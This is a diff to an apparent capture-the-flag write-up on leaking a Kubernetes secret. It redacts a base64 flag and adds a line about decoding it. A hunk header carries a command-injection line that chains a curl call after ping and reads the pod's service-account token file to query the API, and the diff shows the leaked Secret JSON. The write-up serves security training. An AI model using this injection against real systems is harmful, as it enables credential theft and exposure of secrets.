@@ -37,7 +37,7 @@ $ ping -c 2 google.com; curl -sk -H "Authorization: Bearer $(cat /var/run/secret
         "resourceVersion": "7993",
         "creationTimestamp": "2026-08-19T15:27:26Z",
         "annotations": {
-          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"data\":{\"flag\":\"SEFNQU1PT1p7bTN0NGQ0dDRfc3ZjX2wzNGszZF9teV90MGszbn0=\"},\"kind\":\"Secret\",\"metadata\":{\"annotations\":{},\"name\":\"flag-secret\",\"namespace\":\"ctf-secrets\"},\"type\":\"Opaque\"}\n"
+          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"data\":{\"flag\":\"<BASE64_FLAG>=\"},\"kind\":\"Secret\",\"metadata\":{\"annotations\":{},\"name\":\"flag-secret\",\"namespace\":\"ctf-secrets\"},\"type\":\"Opaque\"}\n"
         },
         "managedFields": [
           {
@@ -148,6 +148,7 @@ flag is found :
     "flag": "FLAG-BASE64"
 },
 ```
+`data.flag` value is Base64-encoded and is decoded to obtain the flag.
 
 # PoC
 
